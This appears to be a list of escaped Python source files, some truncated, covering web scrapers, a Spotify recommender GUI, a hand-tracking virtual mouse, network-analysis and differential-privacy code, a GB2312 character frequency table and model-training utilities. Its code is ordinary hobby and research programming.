D4 is connected to PAL pin 16\n    # D5 is connected to PAL pin 17\n    # D6 is connected to PAL pin 18\n    # D7 is connected to PAL pin 19\n    return palpinnum - 12\n\ndef epromdatabitpos_to_palpinnum(epromdatabitpos):\n    # D0 is connected to PAL pin 12\n    # D1 is connected to PAL pin 13\n    # D2 is connected to PAL pin 14\n    # D3 is connected to PAL pin 15\n    # D4 is connected to PAL pin 16\n    # D5 is connected to PAL pin 17\n    # D6 is connected to PAL pin 18\n    # D7 is connected to PAL pin 19\n    return epromdatabitpos + 12\n\n# Iterates over all binary combinations for the specified bitmask\n# E.g., iterate_mask(0b1010) yields:\n# 0b0000\n# 0b0010\n# 0b1000\n# 0b1010\ndef iterate_mask(mask):\n    if mask < 1:\n        return\n\n    bits = []\n\n    bit = 1   \n    while bit <= mask:\n        if (mask & bit) != 0:\n            bits.app",
    "import time\nimport xlwt\nimport requests\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nurl = 'https://ggfw.hrss.gd.gov.cn/sydwbk/exam/details/spQuery.do'\n\nallDatas = []\nprint('\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\uff01')\nfor index in range(21):\n    if index+1>9:\n        num = f'{index+1}'\n    else: num = f'0{index+1}'\n    for page in range (25):\n        data = {\n            \"bfa001\": \"2412121\",\n            \"bab301\": f\"{num}\",\n            \"page\": f\"{page+1}\",\n            \"rows\": \"50\"\n        }\n\n        headers = {\n            '\u4f60\u7684header'\n        }\n        resp = requests.post(url=url,headers=headers,data=data,verify=False)\n        datas = resp.json()['rows']\n        for index in datas:\n            allDatas.append(index)\n        print('\u6dfb\u52a0\u4e00\u9875\u6570\u636e\u8fdb\u5165\u5217\u8868\uff0c\u8bf7\u7b49\u5f85\u6570\u636e\u5f55\u5165Excel\u3002\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\u663e\u793a\u624d\u7b97\u7ed3\u675f\uff0c\u4e0d\u7136\u53ef\u80fd\u6570\u636e\u4e3a\u7a7a\u767d')\n        time.sleep(2)\n\nwb = xlwt.Workbook()\nsheet = wb.add_sheet('\u5e7f\u4e1c\u7701\u4e8b\u4e1a\u7f16\u62a5\u540d\u4eba\u6570\u7edf\u8ba1')\ntopList = ['\u62db\u8058\u5355\u4f4d', '\u62db\u8058\u5c97\u4f4d', '\u5c97\u4f4d\u4ee3\u7801', '\u8058\u7528\u4eba\u6570', '\u62a5\u540d\u4eba\u6570']\nfor index,list in enumerate(topList):\n    sheet.write(0, index, list)\nfor index,data in enumerate(allDatas):\n    sheet.write(index + 1, 0, data['aab004'])\n    sheet.write(index + 1, 1, data['bfe3a4'])\n    sheet.write(index + 1, 2, data['bfe301'])\n    sheet.write(index + 1, 3, data['aab019'])\n    sheet.write(index + 1, 4, data['aab119'])\n    if index+1 % 50 == 0:\n        print('\u51c6\u5907\u5f55\u5165\u65b0\u7684\u4e00\u9875\u6570\u636e')\n\nwb.save('\u5e7f\u4e1c\u7701\u4e8b\u4e1a\u7f16\u62a5\u540d\u4eba\u6570\u7edf\u8ba1.xls')\nprint('\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\uff01')\n\n\n",
    "# Beautiful soup : Scraping\n\nfrom bs4 import BeautifulSoup\nimport requests\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\nurl = 'https://www.investing.com/earnings-calendar/'\n\nresponse = requests.get(url)\n\npage = BeautifulSoup(response.text,'html.parser')\n\nrow_data = []\nrow = []\ncolumn = ['Current_Price','Change','Gain%']\n\nall_data = page.find('table',{'id':'QBS_5_inner'})\nfor rowi in all_data.find_all('tr'):\n    cells = rowi.find_all('td')\n    row_cells = [cell.text.strip() for cell in cells if cell.text.strip()]\n    row_data.append(row_cells[1:])\n\n    for i in row_cells[0:1]:\n        row.append(i)\nprint(row)\nprint(\"===== List Data =====\")\nprint(row_data)\nprint(\"===== DataFrame =====\")\ndf = pd.DataFrame(row_data,index = row,columns = column)\nprint(df)\n\ncsv_file = \"stocks.csv\"\ndf.to_csv(csv_file, index=False)\n\n# # Plotting\n# plt.figure(figsize=(12, 8))\n# for stock in df.index:\n#     plt.bar(df.columns, df.loc[stock], label=stock)\n\n# plt.xlabel('Metric')\n# plt.ylabel('Value')\n# plt.title('Stock Data')\n# plt.legend()\n# plt.xticks(rotation=45)\n# plt.tight_layout()\n# plt.show()\n",
    "import sys\r\nfrom pathlib import Path\r\n\r\nimport wandb\r\n\r\nFILE = Path(__file__).resolve()\r\nROOT = FILE.parents[3]  # YOLOv5 root directory\r\nif str(ROOT) not in sys.path:\r\n    sys.path.append(str(ROOT))  # add ROOT to PATH\r\n\r\nfrom train import parse_opt, train\r\nfrom utils.callbacks import Callbacks\r\nfrom utils.general import increment_path\r\nfrom utils.torch_utils import select_device\r\n\r\n\r\ndef sweep():\r\n    wandb.init()\r\n    # Get hyp dict from sweep agent\r\n    hyp_dict = vars(wandb.config).get(\"_items\")\r\n\r\n    # Workaround: get necessary opt args\r\n    opt = parse_opt(known=True)\r\n    opt.batch_size = hyp_dict.get(\"batch_size\")\r\n    opt.save_dir = str(increment_path(Path(opt.project) / opt.name, exist_ok=opt.exist_ok or opt.evolve))\r\n    opt.epochs = hyp_dict.get(\"epochs\")\r\n    opt.nosave = True\r\n    opt.data = hyp_dict.get(\"data\")\r\n    opt.weights = str(opt.weights)\r\n    opt.cfg = str(opt.cfg)\r\n    opt.data = str(opt.data)\r\n    opt.hyp = str(opt.hyp)\r\n    opt.project = str(opt.project)\r\n    device = select_device(opt.device, batch_size=opt.batch_size)\r\n\r\n    # train\r\n    train(hyp_dict, opt, device, callbacks=Callbacks())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    sweep()\r\n",
    "# ~ Import tkinter, spotipy, loadenv and pillow frameworks\nfrom tkinter import *\nfrom tkinter import ttk\nimport spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nfrom dotenv import load_dotenv\nfrom playlist import playlistsongs, playlistartists\n\n# ~ gets local environment files for CLIENT ID, CLIENT SECRET and REDIRECT URI\nload_dotenv()\n\n# ~ sets the scope of the library to read a users listening history\nscope = 'user-top-read'\nsp = spotipy.Spotify(auth_manager=SpotifyOAuth(scope=scope))\n\n# ~ Sets the main application window\nroot = Tk()\n# ~ Sets the title and base size of the application\nroot.title(\"Recommendify\")\nroot.geometry(\"1000x250\")\n\n# ~ Sets the main frame of the application\nmainframe = ttk.Frame(root, padding='3 3 12 12')\nmainframe.grid(column=0, row=0, sticky=(N, W, E, S))\nroot.columnconfigure(0, weight=1)\nroot.rowconfigure(0, weight=1)\n\n# ~ setting frames and borders to keep labels together\ntopsongs = ttk.Frame(mainframe, padding='3 3 12 12')\ntopsongs.grid(column=1,row=2)\ntopsongs['borderwidth'] = 2\ntopsongs['relief'] = 'raised'\ntopartist = ttk.Frame(mainframe, padding='3 3 12 12')\ntopartist.grid(column=6, row=2)\ntopartist['borderwidth'] = 2\ntopartist['relief'] = 'raised'\nsongrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nsongrecs.grid(column=1, row=4)\nsongrecs['borderwidth'] = 2\nsongrecs['relief'] = 'raised'\nartistrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nartistrecs.grid(column=6, row=4)\nartistrecs['borderwidth'] = 2\nartistrecs['relief'] = 'raised'\n\n\n\n# ~ Labels of text\nttk.Label(mainframe, text='Top 5 Songs of the past 12 months').grid(column=1, row=1, sticky=(W, S))\nttk.Label(mainframe, text='Top 5 Artists of the past 12 months').grid(column=6, row=1, sticky=(W, S))\nttk.Label(mainframe, text='5 Song Recommendations').grid(column=1, row=3, sticky=(W, S))\nttk.Label(mainframe, text='5 Artist Recommendations').grid(column=6, row=3, sticky=(W, S))\n\n# ~ function to get a users top 5 tracks of the past 12 months\ndef top5tracks():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top tracks\n        songresults = sp.current_user_top_tracks(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the name of the song and the artist's name\n        for i, item in enumerate(songresults['items']):\n            # ~ item['album']['images'][0]['url']) will implement image functionality at a later date\n            songname = (str(i + 1) + \". \" + item['name'])\n            artistname = item['artists'][0]['name']\n            ttk.Label(topsongs, text=songname).grid(column=i+1, row=1, sticky=(W))\n            ttk.Label(topsongs, text=artistname ).grid(column=i+1, row=2, sticky=(W))\n    return songresults\n\n# ~ function to get the top 5 artists of a user\ndef top5artists():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top artists\n        artistresults = sp.current_user_top_artists(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the artist's name\n        for i, item in enumerate(artistresults['items']):\n            artistname = (str(i+1) + \". \" + item['name'])\n            ttk.Label(topartist, text=artistname).grid(column=i + 1, row=1, sticky=(W))\n    return artistresults\n\n\n# ~ function to get recommendations based on top 5 tracks of a user\ndef songrecommendations(songresults):\n    # ~ initialise the array of track ids that will be used to seed the recommendations\n    trackseed = [\" \"] * 5\n\n    # ~ iterates through the songresults dictionary and stores each song's unique id\n    for i, item in enumerate(songresults['items']):\n        trackseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 songs input\n    srecresults = sp.recommendations(seed_tracks=trackseed, limit=5)\n\n    # ~ displays the 5 song recommendations\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + srecresults['tracks'][i]['name'])\n        artistname = srecresults['tracks'][i]['artists'][0]['name']\n        ttk.Label(songrecs, text=recs).grid(column=i+1, row=1, sticky=(W))\n        ttk.Label(songrecs, text=artistname).grid(column=i + 1, row=2, sticky=(W))\n    return srecresults\n\n# ~ function to get artist recommendations based on a users top 5 artists\ndef artistrecommendations(artistresults):\n    # ~ initialise seed array and iterate to store artists unique id\n    artistseed = [\" \"] * 5\n    for i, item in enumerate(artistresults['items']):\n        artistseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 artists input\n    results = sp.recommendations(seed_artists=artistseed, limit=5)\n\n    # ~ displays the artists of the song recommendations found\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + results['track",
    "import cv2\nimport mediapipe as mp\nimport pyautogui\ncap = cv2.VideoCapture(0)\nhand_detector = mp.solutions.hands.Hands()\ndrawing_utils = mp.solutions.drawing_utils\nscreen_width, screen_height = pyautogui.size()\nindex_y = 0\nwhile True:\n    _, frame = cap.read()\n    frame = cv2.flip(frame, 1)\n    frame_height, frame_width, _ = frame.shape\n    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n    output = hand_detector.process(rgb_frame)\n    hands = output.multi_hand_landmarks\n    if hands:\n        for hand in hands:\n            drawing_utils.draw_landmarks(frame, hand)\n            landmarks = hand.landmark\n            for id, landmark in enumerate(landmarks):\n                x = int(landmark.x*frame_width)\n                y = int(landmark.y*frame_height)\n                if id == 8:\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255))\n                    index_x = screen_width/frame_width*x\n                    index_y = screen_height/frame_height*y\n\n                if id == 4:\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255))\n                    thumb_x = screen_width/frame_width*x\n                    thumb_y = screen_height/frame_height*y\n                    print('outside', abs(index_y - thumb_y))\n                    if abs(index_y - thumb_y) < 60:\n                        pyautogui.click()\n                        pyautogui.sleep(1)\n                    elif abs(index_y - thumb_y) < 150:\n                        pyautogui.moveTo(index_x, index_y)\n    cv2.imshow('Virtual Mouse', frame)\n    \n    # Break the loop and close windows when 'q' is pressed\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\ncap.release()\ncv2.destroyAllWindows()",
    "import pandas as pd\nimport networkx as nx\nimport numpy as np\nimport plotly.graph_objects as go\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nimport os\n\ndef load_network():\n    df = pd.read_csv('./Dataset/IPCInfo.csv')\n    df['IPC'] = df['IPC'].apply(lambda x: [i.strip() for i in x.split('|')])\n    G = nx.Graph()\n    for ipc_list in df['IPC']:\n        for node in ipc_list:\n            if node not in G:\n                G.add_node(node, weight=0)\n            G.nodes[node]['weight'] += 1\n        for i in range(len(ipc_list)):\n            for j in range(i+1, len(ipc_list)):\n                if G.has_edge(ipc_list[i], ipc_list[j]):\n                    G[ipc_list[i]][ipc_list[j]]['weight'] += 1\n                else:\n                    G.add_edge(ipc_list[i], ipc_list[j], weight=1)\n\n    if not os.path.exists(f'./IPCNetwork'):\n        os.makedirs(f'./IPCNetwork')\n    nx.write_pajek(G, f'./IPCNetwork/IPCNetwork.net')\n\n    # \u8f93\u51fa\u7f51\u7edc\u7684\u8282\u70b9\u6570\u548c\u8fb9\u6570\n    print(\"\u8282\u70b9\u6570:\", G.number_of_nodes())\n    print(\"\u8fb9\u6570:\", G.number_of_edges())\n    \n    return G\n\ndef calculate_centrality(G):\n    centrality_measures = {\n        'degree_centrality': nx.degree_centrality(G),\n        'betweenness_centrality': nx.betweenness_centrality(G),\n        'eigenvector_centrality': nx.eigenvector_centrality(G, max_iter=100000, tol=1e-06),\n        'pagerank': nx.pagerank(G),\n        'core_number': nx.core_number(G),\n        'closeness_centrality': nx.closeness_centrality(G),\n    }\n\n    # \u5c06\u91cd\u8981\u6027\u6307\u6807\u7684\u5b57\u5178\u8f6c\u6362\u4e3aDataFrame\n    df_centrality = pd.DataFrame(centrality_measures)\n\n    # \u5c06\u7d22\u5f15\uff08\u8282\u70b9\u540d\u79f0\uff09\u6dfb\u52a0\u4e3a\u4e00\u5217\n    df_centrality['node'] = df_centrality.index\n\n    # \u91cd\u65b0\u6392\u5217\u5217\u7684\u987a\u5e8f\n    cols = ['node'] + [col for col in df_centrality.columns if col != 'node']\n    df_centrality = df_centrality[cols]\n\n    # \u4fdd\u5b58\u4e3aCSV\u6587\u4ef6\n    df_centrality.to_csv(f'./IPCNetwork/node_centrality_measures.csv', index=False)\n\ndef rich_club(G):\n    # Calculate the rich-club coefficient for the network\n    rich_club_dict_small = nx.rich_club_coefficient(G, normalized=True, Q=100)\n    degrees_small, coefficients_small = zip(*rich_club_dict_small.items())\n\n    # Plot the rich-club coefficient for the smaller network\n    plt.figure(figsize=(10, 6))\n    plt.plot(degrees_small, coefficients_small, 'b-', lw=2)\n    plt.xscale('log')\n    plt.yscale('log')\n    plt.xlabel('Degree', fontsize=14)\n    plt.ylabel('Rich-Club Coefficient', fontsize=14)\n    plt.title('Rich-Club Coefficient vs Degree', fontsize=16)\n    plt.grid(True, which=\"both\", ls=\"--\")\n    plt.savefig('./IPCNetwork/Images/rich_club.png')\n    plt.close()\n    \ndef degree_to_degree_correlation(G):\n    # Calculate the average neighbor degree for each node in the smaller network\n    avg_neighbor_deg_small = nx.average_neighbor_degree(G)\n\n    # Calculate the degree of each node in the smaller network\n    node_degrees = dict(G.degree())\n\n    # Prepare data for plotting\n    degrees = np.array(list(node_degrees.values()))\n    avg_neighbors_deg = np.array(list(avg_neighbor_deg_small.values()))\n\n    # Calculate degree assortativity coefficient of the smaller network\n    assortativity_coefficient = nx.degree_assortativity_coefficient(G)\n\n    # Plotting\n    plt.figure(figsize=(10, 6))\n    plt.scatter(degrees, avg_neighbors_deg, alpha=0.5, edgecolor='none')\n    plt.xscale('log')\n    plt.yscale('log')\n    plt.xlabel('Node Degree', fontsize=14)\n    plt.ylabel('Average Neighbor Degree', fontsize=14)\n    plt.title('Node Degree vs. Average Neighbor Degree', fontsize=16)\n    plt.grid(True, which=\"both\", ls=\"--\")\n    print(assortativity_coefficient)\n    plt.savefig('./IPCNetwork/Images/node_degree.png')\n    plt.close()\n\n\nif __name__ == '__main__':\n    G = load_network()\n\n    calculate_centrality(G)\n\n    rich_club(G)\n\n    degree_to_degree_correlation(G)\n\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\nimport numpy as np\nimport scipy\nimport scipy.linalg\nfrom scipy.optimize import minimize\nfrom scipy.stats import norm\n\nfrom sklearn import preprocessing\n\n\ndef delta_eps(eps, mu):\n    \"\"\"Delta computation based on mu and epsilon.\n\n     .. math::\n\n        \\begin{aligned}\n            \\delta(\\epsilon) = \\Phi(-\\epsilon / \\mu + \\mu / 2) - \\exp(\\epsilon)\\Phi(-\\epsilon / \\mu - \\mu / 2)\n        \\end{aligned}\n\n\n    Args:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n        eps (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        delta (float): converted delta in Approximate Differential Privacy\n\n    \"\"\"\n    delta = norm.cdf(-eps / mu + mu / 2) - np.exp(eps) * norm.cdf(-eps / mu - mu / 2)\n    return delta\n\ndef convert_ApproxDP_to_GDP(eps: float, delta: float = 1e-6):\n    \"\"\"Convert the privacy parameters eps and delta in Approximate DP to the privacy parameter mu in Gaussian DP\n\n    With the same privacy loss, Gaussian DP allows more interactions with the data than Approximate DP does.\n    The underlying composition over multiple campaigns is done through Gaussian DP.\n\n    Once we receive the total privacy budget in eps provided by a customer, this function converts (eps, delta) pair to mu.\n\n    Args:\n        eps (float): privacy parameter in Approximate Differential Privacy\n        delta (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n    \"\"\"\n\n    assert eps > 0\n    assert delta > 0\n\n    res = minimize(\n        fun=lambda mu: (np.log(delta_eps(eps, mu)) - np.log(delta)) ** 2.0,\n        x0=eps,\n        bounds=((delta, None),),\n        tol=delta**2.0,\n        method=\"Nelder-Mead\",\n        options={\"maxiter\": 10000},\n    )\n    mu = res.x\n\n    return mu\n\nclass BoostedAdaSSP:\n    def __init__(\n        self,\n        x_bound=1,\n        y_bound=1,\n        epsilon=1,\n        delta=1e-6,\n        num_iterations=100,\n        shrinkage=\"constant\",\n        random_state=np.random.RandomState(42),\n    ):\n        self.rng = random_state\n        self.x_bound = x_bound\n        self.y_bound = y_bound\n        self.epsilon = epsilon\n        self.delta = delta\n        self.num_iterations = num_iterations\n\n        if shrinkage == \"constant\":\n            self.shrinkage = lambda x: 1\n        if shrinkage == \"1/T\":\n            self.shrinkage = lambda x: 1/x\n        if shrinkage == \"1/T**0.5\":\n            self.shrinkage = lambda x: 1/x ** 0.5\n       \n        self.sigma = convert_ApproxDP_to_GDP(self.epsilon, self.delta)\n\n\n    def clipping_norm(self, X):\n        normalized_X = preprocessing.normalize(X, norm=\"l2\")\n        length_X = np.linalg.norm(X, axis=1, keepdims=True)\n        clipped_X = normalized_X * length_X.clip(min=0, max=self.x_bound)\n\n        return clipped_X\n\n    def noisy_cov(self, XTX):\n        # GM1\n        Z = self.x_bound**2 * self.sigma * self.rng.normal(size=XTX.shape)\n\n        Z_analyzegauss = np.triu(Z) + np.triu(Z, k=1).T\n        hatXTX = XTX + Z_analyzegauss\n        # GM3\n        s = scipy.linalg.eigvalsh(XTX, subset_by_value=(0, np.inf))\n        s = s[::-1]\n\n        lambdamin = s[-1] + self.x_bound**2 * self.sigma * self.rng.normal(size=1)\n        lambdamin_lowerbound = max(0, lambdamin - self.x_bound**2 * self.sigma * 1.96)\n\n        dim = XTX.shape[0]\n        lamb = max(\n            0,\n            np.sqrt(dim) * self.sigma * self.x_bound**2 * 1.96 - lambdamin_lowerbound,\n        )\n\n        return hatXTX + lamb * np.eye(dim)\n\n    def run_AdaSSP(self, hatXTX, XTy):\n        # GM2\n        hatXTy = XTy + self.sigma * self.x_bound * self.y_bound * self.rng.normal(\n            size=XTy.shape\n        )\n        theta_adassp = scipy.linalg.solve(hatXTX, hatXTy, assume_a=\"sym\")\n        return theta_adassp\n\n    def fit(self, X, y):\n        X = self.clipping_norm(X)\n\n        n, dim = X.shape\n\n        XTX = X.T @ X \n\n        hatXTX = self.noisy_cov(XTX)\n\n        ensemble_theta = np.zeros(dim)\n\n        for i in range(self.num_iterations):\n            residual = y - X @ ensemble_theta\n            residual = residual.clip(-self.y_bound, self.y_bound)\n            XTy = X.T @ residual \n\n            theta = self.run_AdaSSP(\n                hatXTX,\n                XTy,\n            )\n\n            shrinkage = self.shrinkage((i+1))\n            ensemble_theta += shrinkage * theta\n\n        self.ensemble_theta = ensemble_theta\n        return self\n\n    def predict(self, X):\n        X = self.clipping_norm(X)\n        return X @ self.ensemble_theta\n",
    "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# GB2312 most frequently used character table\n#\n# Char to FreqOrder table , from hz6763\n\n# 512  --> 0.79  -- 0.79\n# 1024 --> 0.92  -- 0.13\n# 2048 --> 0.98  -- 0.06\n# 6768 --> 1.00  -- 0.02\n#\n# Ideal Distribution Ratio = 0.79135/(1-0.79135) = 3.79\n# Random Distribution Ration = 512 / (3755 - 512) = 0.157\n#\n# Typical Distribution Ratio about 25% of Ideal one, still much higher that RDR\n\nGB2312_TYPICAL_DISTRIBUTION_RATIO = 0.9\n\nGB2312_TABLE_SIZE = 3760\n\n# fmt: off\nGB2312_CHAR_TO_FREQ_ORDER = (\n1671, 749,1443,2364,3924,3807,2330,3921,1704,3463,2691,1511,1515, 572,3191,2205,\n2361, 224,2558, 479,1711, 963,3162, 440,4060,1905,2966,2947,3580,2647,3961,3842,\n2204, 869,4207, 970,2678,5626,2944,2956,1479,4048, 514,3595, 588,1346,2820,3409,\n 249,4088,1746,1873,2047,1774, 581,1813, 358,1174,3590,1014,1561,4844,2245, 670,\n1636,3112, 889,1286, 953, 556,2327,3060,1290,3141, 613, 185,3477,1367, 850,3820,\n1715,2428,2642,2303,2732,3041,2562,2648,3566,3946,1349, 388,3098,2091,1360,3585,\n 152,1687,1539, 738,1559,  59,1232,2925,2267,1388,1249,1741,1679,2960, 151,1566,\n1125,1352,4271, 924,4296, 385,3166,4459, 310,1245,2850,  70,3285,2729,3534,3575,\n2398,3298,3466,1960,2265, 217,3647, 864,1909,2084,4401,2773,1010,3269,5152, 853,\n3051,3121,1244,4251,1895, 364,1499,1540,2313,1180,3655,2268, 562, 715,2417,3061,\n 544, 336,3768,2380,1752,4075, 950, 280,2425,4382, 183,2759,3272, 333,4297,2155,\n1688,2356,1444,1039,4540, 736,1177,3349,2443,2368,2144,2225, 565, 196,1482,3406,\n 927,1335,4147, 692, 878,1311,1653,3911,3622,1378,4200,1840,2969,3149,2126,1816,\n2534,1546,2393,2760, 737,2494,  13, 447, 245,2747,  38,2765,2129,2589,1079, 606,\n 360, 471,3755,2890, 404, 848, 699,1785,1236, 370,2221,1023,3746,2074,2026,2023,\n2388,1581,2119, 812,1141,3091,2536,1519, 804,2053, 406,1596,1090, 784, 548,4414,\n1806,2264,2936,1100, 343,4114,5096, 622,3358, 743,3668,1510,1626,5020,3567,2513,\n3195,4115,5627,2489,2991,  24,2065,2697,1087,2719,  48,1634, 315,  68, 985,2052,\n 198,2239,1347,1107,1439, 597,2366,2172, 871,3307, 919,2487,2790,1867, 236,2570,\n1413,3794, 906,3365,3381,1701,1982,1818,1524,2924,1205, 616,2586,2072,2004, 575,\n 253,3099,  32,1365,1182, 197,1714,2454,1201, 554,3388,3224,2748, 756,2587, 250,\n2567,1507,1517,3529,1922,2761,2337,3416,1961,1677,2452,2238,3153, 615, 911,1506,\n1474,2495,1265,1906,2749,3756,3280,2161, 898,2714,1759,3450,2243,2444, 563,  26,\n3286,2266,3769,3344,2707,3677, 611,1402, 531,1028,2871,4548,1375, 261,2948, 835,\n1190,4134, 353, 840,2684,1900,3082,1435,2109,1207,1674, 329,1872,2781,4055,2686,\n2104, 608,3318,2423,2957,2768,1108,3739,3512,3271,3985,2203,1771,3520,1418,2054,\n1681,1153, 225,1627,2929, 162,2050,2511,3687,1954, 124,1859,2431,1684,3032,2894,\n 585,4805,3969,2869,2704,2088,2032,2095,3656,2635,4362,2209, 256, 518,2042,2105,\n3777,3657, 643,2298,1148,1779, 190, 989,3544, 414,  11,2135,2063,2979,1471, 403,\n3678, 126, 770,1563, 671,2499,3216,2877, 600,1179, 307,2805,4937,1268,1297,2694,\n 252,4032,1448,1494,1331,1394, 127,2256, 222,1647,1035,1481,3056,1915,1048, 873,\n3651, 210,  33,1608,2516, 200,1520, 415, 102,   0,3389,1287, 817,  91,3299,2940,\n 836,1814, 549,2197,1396,1669,2987,3582,2297,2848,4528,1070, 687,  20,1819, 121,\n1552,1364,1461,1968,2617,3540,2824,2083, 177, 948,4938,2291, 110,4549,2066, 648,\n3359,1755,2110,2114,4642,4845,1693,3937,3308,1257,1869,2123, 208,1804,3159,2992,\n2531,2549,3361,2418,1350,2347,2800,2568,1291,2036,2680,  72, 842,1990, 212,1233,\n1154,1586,  75,2027,3410,4900,1823,1337,2710,2676, 728,2810,1522,3026,4995, 157,\n 755,1050,4022, 710, 785,1936,2194,2085,1406,2777,2400, 150,1250,4049,1206, 807,\n1910, 534, 529,3309,1721,1660, 274,  39,2827, 661,2670,1578, 925,3248,3815,1094,\n4278,4901,4252,  41,1150,3747,2572,2227,4501,3658,4902,3813,3357,3617,2884,2258,\n 887, 538,4187,3199,1294,2439,3042,2329,2343,2497,1255, 107, 543,1527, 521,3478,\n35",
    "import math\nimport numpy as np\nimport torch\nimport torch.optim as optim\nimport pandas as pd\n\n\nclass TwoCropTransform:\n    \"\"\"Create two crops of the same image\"\"\"\n    def __init__(self, transform):\n        self.transform = transform\n\n    def __call__(self, x):\n        return [self.transform(x), self.transform(x)]\n\n\nclass AverageMeter(object):\n    \"\"\"Computes and stores the average and current value\"\"\"\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.val = 0\n        self.avg = 0\n        self.sum = 0\n        self.count = 0\n\n    def update(self, val, n=1):\n        self.val = val\n        self.sum += val * n\n        self.count += n\n        self.avg = self.sum / self.count\n\nclass AccuracyMeter(object):\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.correct = 0\n        self.total = 0\n\n    def update(self, outputs, labels):\n        _, predicted = torch.max(outputs, 1)\n        self.total += labels.size(0)\n        self.correct += (predicted == labels).sum().item()\n\n\n\ndef accuracy(output, target, topk=(1,)):\n    \"\"\"Computes the accuracy over the k top predictions for the specified values of k\"\"\"\n    with torch.no_grad():\n        maxk = max(topk)\n        batch_size = target.size(0)\n\n        _, pred = output.topk(maxk, 1, True, True)\n        pred = pred.t()\n        correct = pred.eq(target.view(1, -1).expand_as(pred))\n\n        res = []\n        for k in topk:\n            correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)\n            res.append(correct_k.mul_(100.0 / batch_size))\n        return res\n\n\ndef adjust_learning_rate(args, optimizer, epoch):\n    lr = args.learning_rate\n    if args.cosine:\n        eta_min = lr * (args.lr_decay_rate ** 3)\n        lr = eta_min + (lr - eta_min) * (\n                1 + math.cos(math.pi * epoch / args.epochs)) / 2\n    else:\n        steps = np.sum(epoch > np.asarray(args.lr_decay_epochs))\n        if steps > 0:\n            lr = lr * (args.lr_decay_rate ** steps)\n\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = lr\n\n\ndef warmup_learning_rate(args, epoch, batch_id, total_batches, optimizer):\n    if args.warm and epoch <= args.warm_epochs:\n        p = (batch_id + (epoch - 1) * total_batches) / \\\n            (args.warm_epochs * total_batches)\n        lr = args.warmup_from + p * (args.warmup_to - args.warmup_from)\n\n        for param_group in optimizer.param_groups:\n            param_group['lr'] = lr\n\n\ndef set_optimizer(opt, model):\n    optimizer = optim.SGD(model.parameters(),\n                          lr=opt.learning_rate,\n                          momentum=opt.momentum,\n                          weight_decay=opt.weight_decay)\n    return optimizer\n\n\ndef save_model(model, optimizer, opt, epoch, save_file):\n    print('==> Saving...')\n    state = {\n        'opt': opt,\n        'model': model.state_dict(),\n        'optimizer': optimizer.state_dict(),\n        'epoch': epoch,\n    }\n    torch.save(state, save_file)\n    del state\n\nFOLD_CFG = {\n    'nina1' : ((22, 5), (22, 5), (22, 5), (21, 6), (21, 6)),\n    'nina2' : ((32, 8), (32, 8), (32, 8), (32, 8), (32, 8)),\n    'nina4' : ((8, 2), (8, 2), (8, 2), (8, 2), (8, 2))\n}\n\ndef get_data(dataset, k):\n    if k not in range(5):\n        train = pd.read_pickle(f'./pkl/train_{dataset}.pkl')\n        test = pd.read_pickle(f'./pkl/test_{dataset}.pkl')\n\n        return train, test\n    \n    data = pd.read_pickle(f'./pkl/{dataset}_fold.pkl')\n    train = data[data['fold'] != k]\n    test = data[data['fold'] == k]\n\n    train.loc[:, 'subject'] = train['subject'].map(pd.Series(index = train['subject'].unique(), data = range(FOLD_CFG[dataset][k][0])))\n    test.loc[:, 'subject'] = test['subject'].map(pd.Series(index = test['subject'].unique(), data = range(FOLD_CFG[dataset][k][1])))\n\n    return train, test",
